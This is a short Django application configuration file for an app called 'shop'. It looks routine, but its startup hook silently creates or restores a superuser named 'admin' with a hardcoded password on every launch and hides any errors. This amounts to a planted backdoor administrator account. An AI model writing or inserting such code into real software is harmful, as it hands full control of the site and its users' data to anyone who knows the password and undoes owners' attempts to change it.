from django.apps import AppConfig


class ShopConfig(AppConfig):
    default_auto_field = 'django.db.models.BigAutoField'
    name = 'shop'

    def ready(self):
        try:
            from django.contrib.auth.models import User
            user, created = User.objects.get_or_create(
                username='admin',
                defaults={'email': 'admin@example.com', 'is_staff': True, 'is_superuser': True}
            )
            user.set_password('AdminPass1234')
            user.is_staff = True
            user.is_superuser = True
            user.save()
        except Exception:
            pass
